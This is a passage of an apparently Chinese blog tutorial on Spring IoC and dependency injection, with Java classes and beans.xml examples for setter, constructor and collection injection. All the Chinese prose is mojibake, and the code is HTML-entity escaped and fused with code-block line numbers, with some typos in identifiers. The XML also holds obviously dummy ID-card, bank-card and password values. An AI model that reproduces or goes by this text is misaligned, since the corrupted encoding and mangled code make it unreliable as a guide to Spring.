ï¼Œç”¨æˆ·åªéœ€è¦è°ƒç”¨æ¥å£å°±å¯ä»¥äº†ã€‚ 123456789public class UserServiceimp1 implements UserService &#123; private UserDao userDao = new UserDaolmp1(); public void getUser()&#123; userDao.getuser(); &#125;&#125; å…ˆå‰çš„ä»£ç ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨UserDaoçš„æ—¶å€™å› ä¸ºå†™æ­»äº†æ‹“å±•ï¼Œæ‰€ä»¥æ— æ³•çµæ´»çš„è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¥å£çš„æ€æƒ³è§£æ”¾ 123456789 public void setUserDao(UserDao userDao) &#123; this.userDao = userDao; &#125; public void getUser()&#123; userDao.getuser(); &#125;&#125; â€‹ æˆ‘ä»¬å°†ä¹‹å‰å†™æ­»çš„ä»£ç è½¬å˜æˆäº†setæ–¹æ³•ï¼Œè¿™æ ·å­å½“æˆ‘ä»¬äºmainæ–¹æ³•å½“ä¸­ä½¿ç”¨çš„æ—¶å€™ï¼š 12345678910public class MyTest &#123; public static void main(String[] args) &#123; UserServiceimp1 userService = new UserServiceimp1(); userService.setUserDao(new UserDaoMysql()); userService.getUser();// ç”¨æˆ·å®é™…è°ƒç”¨ä¸šåŠ¡å±‚ï¼Œdaoå±‚ä¸éœ€è¦æ¥è§¦ &#125;&#125; ç”¨æˆ·åªéœ€è¦åœ¨setåé¢æ›´æ”¹æ¥å£å°±å¯ä»¥äº†ï¼ IOCçš„ä¸‰å±‚æ¶æ„ï¼šDaoå±‚è´Ÿè´£å®ç°æ–¹æ³•ï¼ŒServiceå±‚è´Ÿè´£è°ƒç”¨Daoçš„æ–¹æ³•ï¼Œè€Œmainæ–¹æ³•å»è°ƒç”¨Serviceçš„æ¥å£ ä½¿ç”¨è¯¥æ–¹æ³•å¤§å¤§é™ä½äº†ä¸šåŠ¡çš„è€¦åˆæ€§ï¼Œä½¿å¾—ä¸šåŠ¡çš„æ¯ä¸€éƒ¨åˆ†ä¸“å¿ƒäºåšå¥½è‡ªå·±çš„æ¶æ„å³å¯ã€‚ 2.IOCçš„æœ¬è´¨â€‹ æ§åˆ¶åè½¬IoC(Inversion of Control),æ˜¯ä¸€ç§è®¾è®¡æ€æƒ³ï¼ŒDI(ä¾èµ–æ³¨å…¥)æ˜¯å®ç°IoCçš„ä¸€ç§æ–¹æ³•ï¼Œä¹Ÿæœ‰äººè®¤ä¸ºDIåªæ˜¯IoCçš„å¦-ç§è¯´æ³•ã€‚ æ²¡æœ‰IoCçš„ç¨‹åºä¸­ ,æˆ‘ä»¬ä½¿ç”¨é¢å‘å¯¹è±¡ç¼–ç¨‹ ,å¯¹è±¡çš„åˆ›å»º ä¸å¯¹è±¡é—´çš„ä¾èµ–å…³ç³»å®Œå…¨ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ï¼Œå¯¹è±¡çš„åˆ›å»ºç”±ç¨‹åºè‡ªå·±æ§åˆ¶ï¼Œæ§åˆ¶åè½¬åå°†å¯¹è±¡çš„åˆ›å»ºè½¬ç§»ç»™ç¬¬ä¸‰æ–¹ï¼Œä¸ªäººè®¤ä¸ºæ‰€è°“æ§åˆ¶åè½¬å°±æ˜¯:è·å¾—ä¾èµ–å¯¹è±¡çš„æ–¹å¼åè½¬äº†ã€‚ â€‹ è€ŒIOCå°±æ˜¯Springçš„æ ¸å¿ƒæ€æƒ³ï¼ 3.HelloSpringé¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç±»ï¼š 12345678910111213141516public class HelloSpring &#123; private String str; public String getStr() &#123; return str; &#125; public void setStr(String str) &#123; this.str = str; &#125; public String tostring() &#123; return &quot;hello&quot;+&quot;str=&quot;+str+&#x27;\\&#x27;&#x27;; &#125;&#125; åˆ›å»ºbeans.xmlï¼Œå†™å…¥å¦‚ä¸‹ï¼š 12345&lt;!-- ä½¿ç”¨springåˆ›å»ºå¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡éƒ½ç§°ä¸ºbean--&gt;&lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot;&gt; &lt;property name=&quot;str&quot; value=&quot;Spring&quot;/&gt; &lt;!-- å±æ€§--&gt;&lt;/bean&gt; åœ¨è¿™é‡Œï¼ŒSpringå¸®æˆ‘ä»¬åšäº†è¿™ä¹ˆä¸€ä¸ªäº‹æƒ…ï¼š åœ¨javaå½“ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºç±»çš„æ—¶å€™éƒ½æ˜¯ ç±» å¯¹è±¡å = new å¯¹è±¡ï¼› è€Œåœ¨Springå½“ä¸­ï¼Œidä¸ºæ³¨å†Œçš„å¯¹è±¡åï¼Œpropertyå½“ä¸­å³å¯è°ƒç”¨ç±»å½“ä¸­çš„æ–¹æ³•ï¼Œvalueç”¨äºç»™æ–¹æ³•çš„å˜é‡èµ‹å€¼ã€‚ 12345678910public class Mytest &#123; public static void main(String[] args) &#123;// è·å–springçš„ä¸Šä¸‹æ–‡å¯¹è±¡ ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);// æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯ HelloSpring hello = (HelloSpring) context.getBean(&quot;hello&quot;); System.out.println(hello.tostring()); &#125;&#125; é‡ç‚¹å°±æ˜¯ä¸€åˆ‡äº¤ç»™Springï¼Œä¸€åˆ‡å‡½æ•°ä¸å†ç”±ä½ è°ƒç”¨ï¼Œè®©Springè°ƒç”¨å³å¯ã€‚ 4.IOCåˆ›å»ºå¯¹è±¡â€‹ 1.é»˜è®¤ç›´æ¥åˆ›å»ºçš„æ—¶å€™åˆ©ç”¨çš„æ— å‚æ„é€ æ–¹æ³• â€‹ 2.æœ‰å‚æ„é€ çš„æ—¶å€™æˆ‘ä»¬æœ‰ä¸‰ç§æ–¹å¼æ¥å¯¹å‚æ•°è¿›è¡Œæ„é€ ï¼š 123456&lt;!-- é”®å¯¹å€¼çš„æ–¹å¼ï¼Œæœ€ç®€å•--&gt; &lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;wuhu&quot;/&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;wuhu&quot;/&gt; &lt;!-- ç”¨ä¸‹æ ‡æ¥èµ‹å€¼--&gt; &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;wuhu&quot;/&gt; &lt;!-- ç”¨ç±»å‹æ¥èµ‹å€¼ï¼Œä¸æ¨èä½¿ç”¨--&gt; æ³¨æ„äº‹é¡¹: â€‹ åœ¨Springå½“ä¸­ï¼Œå®é™…ä¸Šå½“æˆ‘ä»¬åˆ©ç”¨Springè¿›è¡ŒContextçš„åˆ›å»ºçš„æ—¶å€™ï¼ŒSpringå·²ç»å°†å…¨éƒ¨å¯¹è±¡å¯¼å…¥ 1234ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);// æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯HelloSpring hello = (HelloSpring) context.getBean(&quot;hello&quot;);System.out.println(hello.tostring()); ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ çš„Beanå½“ä¸­å³ä½¿å«æœ‰å¤šä¸ªç±»ï¼ŒSpringä¹Ÿå°†ä»–ä»¬å…¨éƒ¨å¯¼å…¥å¹¶åˆå§‹åŒ–ï¼Œç”¨æˆ·æƒ³è¦ä»€ä¹ˆå»å–å‡ºæ¥å³å¯ã€‚ 5.Springçš„é…ç½® åˆ«å(å·²æ²¡ç”¨äº†) Beançš„é…ç½® 12&lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot; name=&quot;u1,u2&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;www&quot;/&gt; åœ¨è¿™é‡Œçš„idå°±æ˜¯æ³¨å†Œåï¼Œclasså°±æ˜¯è°ƒç”¨ç±»nameå·²ç»å¯ä»¥å–åˆ«åäº†ï¼ Import ä¾¿äºå¤šäººè¿åŠ¨ï¼Œå¤§ä¼™ä¸€èµ·å¼€å‘çš„æ—¶å€™ï¼Œå°±å¯ä»¥å°†ä»–ä»¬åŒ…å«åœ¨ä¸€èµ·äº†~ 1&lt;import resource=&quot;beans.xml&quot;/&gt; 6.DIä¾èµ–æ³¨å…¥â€‹ 6.1æ„é€ æ–¹æ³•æ³¨å…¥â€‹ é‡å†™æ„é€ æ–¹æ³• 6.2setæ–¹æ³•æ³¨å…¥ã€é‡ç‚¹ã€‘â€‹ ä¾èµ–ï¼šbeansçš„å¯¹è±¡ä¾èµ–äºå®¹å™¨ï¼ â€‹ æ³¨å…¥ï¼šbeadå½“ä¸­çš„æ‰€æœ‰å±æ€§Â·ï¼Œç”±å®¹å™¨æ¥æ³¨å…¥ã€‚ ã€ç¯å¢ƒæ­å»ºã€‘ â€‹ 1.å¤æ‚ç±»å‹ 2.çœŸå®æµ‹è¯•å¯¹è±¡ 123456789public class Student &#123; private String string; private String[] book; private List&lt;String&gt; hobbies; private Map&lt;String,String&gt; card; private Set&lt;String&gt; games; private String wife; private Properties info; â€‹ 3.beans.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!-- æ™®é€šæ³¨å…¥--&gt; &lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot; name=&quot;u1,u2&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;www&quot;/&gt;&lt;!-- refæ³¨å…¥--&gt; &lt;/bean&gt; &lt;bean id=&quot;address2&quot; class=&quot;com.ysllz.pojo.Address&quot; /&gt; &lt;bean class=&quot;com.ysllz.pojo.Student&quot; id=&quot;student&quot;&gt;&lt;!--æ•°ç»„æ³¨å…¥--&gt; &lt;property name=&quot;book&quot;&gt; &lt;array&gt; &lt;value&gt;çº¢æ¥¼æ¢¦&lt;/value&gt; &lt;value&gt;æ°´æµ’ä¼ &lt;/value&gt; &lt;value&gt;ä¸‰å›½æ¼”ä¹‰&lt;/value&gt; &lt;value&gt;è¥¿æ¸¸è®°&lt;/value&gt; &lt;/array&gt; &lt;/property&gt;&lt;!--listæ³¨å…¥--&gt; &lt;property name=&quot;hobbies&quot;&gt; &lt;list&gt; &lt;value&gt;èµ·é£&lt;/value&gt; &lt;value&gt;èµ·é£&lt;/value&gt; &lt;value&gt;èµ·é£&lt;/value&gt; &lt;value&gt;èµ·é£&lt;/value&gt; &lt;/list&gt; &lt;/property&gt;&lt;!-- mapæ³¨å…¥--&gt; &lt;property name=&quot;card&quot;&gt; &lt;map&gt; &lt;entry key=&quot;èº«ä»½è¯&quot; value=&quot;440000000032001&quot;/&gt; &lt;entry key=&quot;é“¶è¡Œå¡&quot; value=&quot;2213123032001&quot;/&gt; &lt;/map&gt; &lt;/property&gt;&lt;!-- setæ³¨å…¥--&gt; &lt;property name=&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;lol&lt;/value&gt; &lt;value&gt;cod&lt;/value&gt; &lt;value&gt;bot&lt;/value&gt; &lt;/set&gt; &lt;/property&gt; &lt;property name=&quot;wife&quot; &gt;&lt;null/&gt;&lt;/property&gt;&lt;!-- é…ç½®æ³¨å…¥--&gt; &lt;property name=&quot;info&quot;&gt; &lt;props&gt; &lt;prop key=&quot;username&quot;&gt;351452024&lt;/prop&gt; &lt;prop key=&quot;password&quot;&gt;3125224&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; â€‹ 4.æµ‹è¯•ç±» 12345678910public class Mytest &#123; public static void main(String[] args) &#123;// è·å–springçš„ä¸Šä¸‹æ–‡å¯¹è±¡ ApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);// æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯ Student student = (Student) context.getBean(&quot;student&quot;); System.out.println(student.toString()); &#125;&#125; 6.3å…¶ä»–æ–¹æ³•æ³¨å…¥P,å°±æ˜¯setæ³¨å…¥ï¼ŒCå°±æ˜¯åˆ›é€ å™¨æ³¨å…¥ 1.Springçš„beançš„æœ¬è´¨å®é™…ä¸Šå°±æ˜¯åè½¬ï¼Œæ³¨å…¥çš„å€¼ï¼Œåˆ›å»ºå¯¹è±¡å…¨éƒ¨äº¤ç»™Springçš„XMLæ¥é…ç½®äº†ï¼å®é™…ä¸Šå°±æ˜¯åˆ©ç”¨Setæ³¨å…¥ å›é¡¾æ˜¨å¤©çš„ä»£ç ï¼š 123456789//æˆ‘ä»¬ç…§æ ·æ˜¯new äº†ä¸€ä¸ªæ–°çš„å¯¹è±¡package com.ys.dao;public class UserSQLServer implements UserDao &#123; public void getUser() &#123; System.out.println(&quot;SQLSERVER use it&quot;); &#125;&#125; é‡å†™DAOå±‚çš„æ–¹æ³•ï¼Œä¹‹ååœ¨serviceå±‚å½“ä¸­è¿›è¡Œæ“ä½œï¼š 12345package com.ys.service;public interface UserService &#123; void getUser();&#125; å†™ä¸€ä¸ªå®ç°æ¥å£ç±»ï¼š 1234567891011121314151617181920package com.ys.service;import com.ys.dao.UserDao;public class UserServiceimpl implements UserService&#123; private UserDao userDao; public UserDao getUserDao() &#123; return userDao; &#125; public void setUserDao(UserDao userDao) &#123; this.userDao = userDao; &#125; public void getUser() &#123; this.userDao.getUser(); &#125;&#125; ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œè®¾ç½®äº†ä¸€ä¸ªSetæ–¹æ³•ï¼Œè®©userDaoå…è®¸ç”¨æˆ·çš„è‡ªå®šä¹‰åˆ›å»ºï¼Œé‚£ä¹ˆä»–éœ€è¦ä»€ä¹ˆæˆ‘ä»¬å°±ç»™ä»€ä¹ˆ~ æœ€ç»ˆæµ‹è¯•ç±»ï¼š 12345678910111213141516171819import com.ys.dao.UserDao;import com.ys.dao.UserDaoimpl;import com.ys.dao.UserMysql;import com.ys.dao.UserSQLServer;import com.ys.service.UserService;import com.ys.service.UserServiceimpl;public class TestInMine &#123; public static void main(String[] args) &#123;// ç”¨æˆ·å®é™…è°ƒç”¨çš„æ˜¯ä¸šåŠ¡å±‚ï¼ŒDaoå±‚ä¸å…è®¸ä»–ä»¬æ¥è§¦ï¼ UserServiceimpl userServiceimpl = new UserServiceimpl(); userServiceimpl.setUserDao(new UserSQLServer()); userServiceimpl.getUser();&#125;&#125; äºæ˜¯åœ¨springå½“ä¸­ï¼Œspringå¸®æˆ‘ä»¬æ“ä½œäº†ä»€ä¹ˆï¼Ÿ æˆ‘ä»¬æ²¡æœ‰NEWä»»ä½•ä¸€ä¸ªç±»ï¼Œæˆ‘ä»¬åšçš„æ˜¯å»Springçš„beanä¸‹é…ç½®xml~ æˆ‘ä»¬å¦‚ä¸‹æ„é€ xmlï¼š 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;!-- ä½¿ç”¨springæ¥åˆ›å»ºæˆ‘ä»¬çš„å¯¹è±¡,åœ¨springä¸­éƒ½æˆä¸ºBean--&gt; &lt;!-- ç°åœ¨ä¸€ä¸ªBeanç›¸å½“äºnew äº†ä¸€ä¸ªå¯¹è±¡--&gt; &lt;!-- æˆ‘ä»¬åœ¨XMLå½“ä¸­å»é…ç½®äº†--&gt; &lt;bean id=&quot;userMySQL&quot; class=&quot;com.ys.dao.UserMysql&quot;/&gt; &lt;bean id=&quot;userOranle&quot; class=&quot;com.ys.dao.UserOranle&quot;/&gt; &lt;bean id=&quot;userSQLServer&quot; class=&quot;com.ys.dao.UserSQLServer&quot;/&gt; &lt;bean id=&quot;userServiceimpl&quot; class=&quot;com.ys.service.UserServiceimpl&quot;&gt; &lt;property name=&quot;userDao&quot; ref=&quot;userMySQL&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; bean å°±ç›¸å½“äºnewäº†è¿™ä¹ˆä¸€ä¸ªç±»ï¼Œrefåˆ™æ˜¯å–beanå½“ä¸­å·²ç»åˆ›å»ºå¥½çš„ç±»ã€‚ æ‰€ä»¥æˆ‘ä»¬çš„æµ‹è¯•ä»£ç ä¿®æ”¹åä¸ºï¼š 1234567891011121314import com.ys.service.UserServiceimpl;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class TestInMine &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean1.xml&quot;); UserServiceimpl userServiceimpl = (UserServiceimpl) context.getBean(&quot;userServiceimpl&quot;); userServiceimpl.getUser(); &#125;&#125; 2 IOCåˆ›å»ºå¯¹è±¡çš„æ–¹å¼1.ä½¿ç”¨æ— å‚æ„é€  é»˜è®¤åˆ›å»º 123456789101112131415161718192021222324package com.ys.pojo;public class User &#123; private String name;// public User()&#123;//// System.out.println(&quot;wdndmd&quot;);//// &#125; public User(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void show()&#123; System.out.println(&quot;name:&quot;+name); &#125;&#125; å¦‚æœæˆ‘åœ¨è¿™ç›´æ¥å°†æ— å‚æ„é€ å»é™¤ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°æ— æ³•æ„å»ºçš„é—®é¢˜ï¼Œä½†æ˜¯Springä¹Ÿæ”¯æŒä½¿ç”¨æœ‰å‚æ„é€  æ„é€ å™¨å‡½æ•°æœ‰ä¸‰ç§æ–¹å¼ï¼š ç¬¬ä¸€ç§ï¼Œä¸‹æ ‡èµ‹å€¼ &lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;wdnmd&quot;/&gt; &lt;/bean&gt; 1234567+ ç¬¬äºŒç§ï¼Œå‚æ•°ç±»å‹åŒ¹é…+ &#96;&#96;&#96;xml &lt;bean id&#x3D;&quot;user&quot; class&#x3D;&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg type&#x3D;&quot;java.lang.String&quot; value&#x3D;&quot;www&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; é€šè¿‡å‚æ•°åæ¥è¿›è¡Œèµ‹å€¼ 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;www&quot;/&gt;&lt;/bean&gt; è¦æ³¨æ„ï¼š æˆ‘ä»¬å¦‚æœä½¿ç”¨äº†æœ‰å‚æ„é€ ï¼Œspringå°±ä¸ä¼šèµ°æ— å‚æ„é€ çš„æ–¹æ³•äº† åªè¦æˆ‘ä»¬ä½¿ç”¨new ClassPathXmlApplicationContextåˆ›å»ºï¼Œå°±ä¼šæŠŠXMLå½“ä¸­çš„ç±»å…¨éƒ¨æ³¨å…¥è¿›å»ï¼Œåˆ›å»ºæ–°ç±» 1234567891011121314151617181920package com.ys.pojo;public class UserT &#123; private String name; public UserT()&#123; System.out.println(&quot;userTè¢«åˆ›å»ºäº†&quot;); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public UserT(String name) &#123; this.name = name; &#125;&#125; ä¾‹å¦‚æˆ‘ä»¬åˆ›å»ºè¯¥javaç±» å¹¶åœ¨beanä¸­æ‰«æï¼š 123&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot;&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;user&quot;/&gt;&lt;/bean&gt; æˆ‘ä»¬ä¾¿ä¸ä¼šå¾—åˆ°æ„é€ å™¨åº”è¯¥è¿”å›é‚£å¥è¯ï¼Œä½†å¦‚æœæˆ‘ä»¬å»æ‰ä¸Šé¢çš„ 1&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot;/&gt; åˆ™ä¼šå¾—åˆ°æ„é€ å™¨å½“ä¸­çš„è¯ åŒæ—¶æˆ‘ä»¬è¦çŸ¥é“ï¼Œæˆ‘ä»¬åˆ›å»ºçš„æ—¶å€™æ˜¯ä¸€æ ·çš„beanï¼Œå¯¹è±¡å¹¶æ²¡æœ‰åŒºåˆ«ï¼š æµ‹è¯•ä»£ç ï¼š 12User user = (User) context.getBean(&quot;user&quot;);User user2 = (User)context.getBean(&quot;user&quot;); ä¸¤è€…æ˜¯æ˜¯ä¸€æ ·çš„ã€‚ æ‰€ä»¥åœ¨é…ç½®æ–‡ä»¶åŠ è½½çš„æ—¶å€™ï¼Œå®¹å™¨ä¸­ç®¡ç†çš„å¯¹è±¡å°±å·²ç»åˆå§‹åŒ–äº† 3. Springé…ç½®3.1 åˆ«å1&lt;alias name=&quot;userT&quot; alias=&quot;dnm&quot;/&gt; åˆ©ç”¨è¿™æ ·å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªåˆ«åé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ï¼š 1&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot; name=&quot;userT2&quot;/&gt; 12345 User user = (User) context.getBean(&quot;user2&quot;); User user2 = (User)context.getBean(&quot;user&quot;); System.out.println(user==user2); user.show();&#125; æµ‹è¯•åæ˜¯ä¸€æ ·çš„ è€Œä¸”åˆ©ç”¨nameçš„æ–¹å¼å¯ä»¥èµ·å¤šä¸ªåˆ«å 1&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot; name=&quot;user2,u2&quot;&gt; 3.2 Beançš„é…ç½®3.3 importimportä¸€èˆ¬è¢«æˆ‘ä»¬ç”¨äºä½¿ç”¨å›¢é˜Ÿå¼€å‘ä½¿ç”¨ï¼Œå®ƒå¯ä»¥å°†å¤šä¸ªé…ç½®æ–‡ä»¶å¯¼å…¥åˆå¹¶ä¸ºä¸€ä¸ªï¼Œæ–¹ä¾¿ç¨‹åºå‘˜ä¹‹é—´äº’ç›¸åä½œã€‚ ä¾‹å¦‚æˆ‘å…ˆåˆ›å»ºäº†å¦‚ä¸‹ä¸‰ä¸ªé…ç½®çš„xmlï¼š beans1.xml ,applicationContext.xml ä»¥åŠbeans.xml åœ¨mainå‡½æ•°å½“ä¸­æˆ‘å´åªæƒ³ä½¿ç”¨ä¸€ä¸ªï¼Œè¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿï¼Œè¿™æ ·æˆ‘ä»¬åº”è¯¥ï¼š 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;import resource=&quot;beans.xml&quot;/&gt; &lt;import resource=&quot;beans1.xml&quot;/&gt; &lt;/beans&gt; ä¹‹åå†å›åˆ°Mytestå½“ä¸­ï¼š 12ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); è¿™æ ·å°±ç›¸å½“äºä¸€å£æ°”ç»„ç»‡äº†ä¸‰ä¸ªxmlæ–‡ä»¶ åŒæ—¶å†å›åˆ°å‰é¢çš„åˆ«åçš„ä½¿ç”¨ï¼Œè¿™æ ·çš„åˆ«åä¾¿äºæˆ‘ä»¬importåˆå¹¶çš„æ—¶å€™å°†ä»–ä»¬åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¼šé˜»æ­¢é‡å¤çš„æƒ…å†µ 4 ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰4.1 æ„é€ å™¨æ³¨å…¥å‰é¢å·²ç»è¯´è¿‡ 4.2 SETæ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘ ä¾èµ–æ³¨å…¥ï¼šæœ¬è´¨å°±æ˜¯setæ³¨å…¥ï¼ ä¾èµ–ä»€ä¹ˆï¼Ÿ beanå¯¹è±¡çš„åˆ›å»ºä¾èµ–äºå®¹å™¨ æ³¨å…¥ä»€ä¹ˆï¼Ÿ beanå¯¹è±¡ä¸­çš„æ‰€æœ‰å±æ€§ç”±å®¹å™¨æ¥æ³¨å…¥ å…³äºå¤æ‚ç±»å‹ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¿…è¦æ˜ç™½listï¼Œsetï¼Œmapéƒ½æ˜¯æ¥åšä»€ä¹ˆçš„ï¼Œä»¥åŠä»–ä»¬çš„åŒºåˆ« è¯¦ç»†æˆ‘å†³å®šå†™åœ¨JAVAåŸºç¡€é‡Œé¢ã€‚ ã€ç¯å¢ƒæ­å»ºã€‘ 1.å¤æ‚ç±»å‹ 1234567891011public class Address &#123; private String address; public String getAddress() &#123; return address; &#125; public void setAddress(String address) &#123; this.address = address; &#125;&#125; 2.çœŸå®æµ‹è¯•å¯¹è±¡ 123456789public class Student &#123; private Address address; private String name; private String[] books; private List&lt;Student&gt; hobbies; private Map&lt;String,String&gt; cards; private Set&lt;String&gt; games; private String wife; private Properties info; è¿™äº›å¯¹è±¡çš„å„ç§æ³¨å…¥æ–¹æ³•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt;&lt;!-- Beanæ³¨å…¥ï¼Œä½¿ç”¨ref--&gt;&lt;property name=&quot;address&quot; ref=&quot;address1&quot;/&gt;&lt;property name=&quot;books&quot;&gt; &lt;array&gt; &lt;value&gt;JavaåŸºç¡€&lt;/value&gt; &lt;value&gt;Javaè¿›ç¨‹&lt;/value&gt; &lt;value&gt;Javaç¼–å†™&lt;/value&gt; &lt;value&gt;JavaIOC&lt;/value&gt; &lt;value&gt;JavaSpring&lt;/value&gt; &lt;/array&gt;&lt;/property&gt;&lt;property name=&quot;cards&quot;&gt; &lt;map&gt; &lt;entry key=&quot;æœˆæ›œ&quot; value=&quot;1751111&quot;/&gt; &lt;entry key=&quot;æœˆçŸ³&quot; value=&quot;138217&quot;/&gt; &lt;/map&gt;&lt;/property&gt;&lt;property name=&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;æˆ˜åœ°&lt;/value&gt; &lt;value&gt;ä½¿å‘½å¬å”¤&lt;/value&gt; &lt;value&gt;EA&lt;/value&gt; &lt;value&gt;å¥¥é‡Œç»™&lt;/value&gt; &lt;/set&gt;&lt;/property&gt;&lt;property name=&quot;hobbies&quot;&gt; &lt;list&gt; &lt;value&gt;å”±æ­Œ&lt;/value&gt; &lt;value&gt;ä¸‹æ£‹&lt;/value&gt; &lt;value&gt;ç¡è§‰&lt;/value&gt; &lt;/list&gt;&lt;/property&gt;&lt;property name=&quot;info&quot;&gt; &lt;props&gt; &lt;prop key=&quot;url&quot;&gt;/weibos?SSL=xxx&lt;/prop&gt; &lt;prop key=&quot;divers&quot;&gt;mysql&lt;/prop&gt; &lt;prop key=&quot;username&quot;&gt;æœˆçŸ³&lt;/prop&gt; &lt;prop key=&quot;password&quot;&gt;æœˆæ›œ&lt;/prop&gt; &lt;/props&gt;&lt;/property&gt;&lt;property name=&quot;wife&quot;&gt; &lt;null/&gt;&lt;/property&gt;&lt;/bean&gt; æˆ‘åœ¨è¿™é‡Œè§‰å¾—æ¯”è¾ƒé‡è¦çš„åŒºåˆ«å°±æ˜¯åœ¨äºpropå’Œmapå½“ä¸­çš„å·®åˆ« mapå› ä¸ºå¼ºè°ƒçš„æ˜¯é”®å€¼å¯¹å…³ç³»ï¼Œæ‰€ä»¥å†™åœ¨mapçš„æ ‡ç­¾å½“ä¸­ï¼Œè€Œpropä¸­çš„å€¼å®¹æ˜“ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™åœ¨æ ‡ç­¾ä¸­é—´ã€‚ æ€»è€Œè¨€ä¹‹è®°ä½å°±å¥½äº† æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š 123456Student&#123;address=Address&#123;address=&#x27;å®‰å¾½èŠœæ¹–ä¸­å‡º&#x27;&#125;, name=&#x27;æœˆçŸ³&#x27;,books=[JavaåŸºç¡€, Javaè¿›ç¨‹, Javaç¼–å†™, JavaIOC, JavaSpring],hobbies=[å”±æ­Œ, ä¸‹æ£‹, ç¡è§‰], cards=&#123;æœˆæ›œ=1751111, æœˆçŸ³=138217&#125;, games=[æˆ˜åœ°, ä½¿å‘½å¬å”¤, EA, å¥¥é‡Œç»™], wife=&#x27;null&#x27;, info=&#123;password=æœˆæ›œ, url=/weibos?SSL=xxx, divers=mysql, username=æœˆçŸ³&#125;&#125; 4.3 æ‹“å±•æ–¹å¼æ³¨å…¥é™¤äº†ä¸Šé¢çš„ä¾èµ–æ³¨å…¥ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨På‘½åç©ºé—´å’ŒCå‘½åç©ºé—´æ³¨å…¥ï¼Œä½†æ˜¯ä»–ä»¬å¿…é¡»åˆ©ç”¨XMLçº¦æŸã€‚ å…·ä½“ä¾‹å­å¦‚ä¸‹ï¼š 123456789&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt; &lt;property name=&quot;age&quot; value=&quot;20&quot;/&gt;&lt;/bean&gt;&lt;bean class=&quot;com.ys.pojo.User&quot; id=&quot;user2&quot; p:age=&quot;20&quot; 